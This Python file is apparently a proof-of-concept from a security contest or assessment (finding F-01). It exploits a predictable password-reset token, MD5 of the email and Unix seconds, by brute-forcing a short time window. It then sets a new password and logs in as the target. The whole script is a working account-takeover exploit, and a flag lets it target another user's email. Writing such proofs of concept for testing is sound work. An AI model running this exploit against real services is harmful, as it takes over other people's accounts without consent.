# -*- coding: utf-8 -*-
"""F-01. Токен сброса = MD5(email + ':' + unix-секунды). Письмо никуда не уходит.

По умолчанию заводит свою жертву, чтобы не трогать seed-пароль alice.
Чужой email: python 01_password_reset.py --email alice@contest.ru --new-password 'TempPass!poc1'
"""
import hashlib
import time

from _http import Client, parser


def reset_password(client: Client, email: str, new_password: str, window: int = 5) -> str:
    t0 = int(time.time())
    status, _, raw = client.call("POST", "/api/users/reset", body={"email": email})
    t1 = int(time.time())
    if status != 200:
        raise SystemExit(f"запрос сброса отклонён: {status} {raw[:200]!r}")
    for ts in range(t0 - 3, t1 + window):
        token = hashlib.md5(f"{email}:{ts}".encode()).hexdigest()
        status, _, _ = client.call(
            "POST",
            "/api/users/reset/confirm",
            body={"email": email, "token": token, "password": new_password},
        )
        if status == 200:
            return token
    raise SystemExit("токен не подошёл в окне времени")


def main():
    p = parser("Предсказуемый сброс пароля")
    p.add_argument("--email", default="", help="email жертвы; пусто — создать свою")
    p.add_argument("--new-password", default="TempPass!poc1")
    args = p.parse_args()
    client = Client(args.base)
    email = args.email
    if not email:
        stamp = str(int(time.time()))[-6:]
        email = f"reset{stamp}@poc.local"
        client.register(f"reset{stamp}", email, "Passw0rd!original")
    token = reset_password(client, email, args.new_password)
    got = client.token_of(email, args.new_password)
    who, data, _ = client.call("GET", "/api/user", token=got)
    if who != 200 or data["user"]["email"] != email:
        raise SystemExit("новый пароль не открыл ту же учётку")
    print(f"OK сброс {email} token={token} вошли как {data['user']['username']}")


if __name__ == "__main__":
    main()
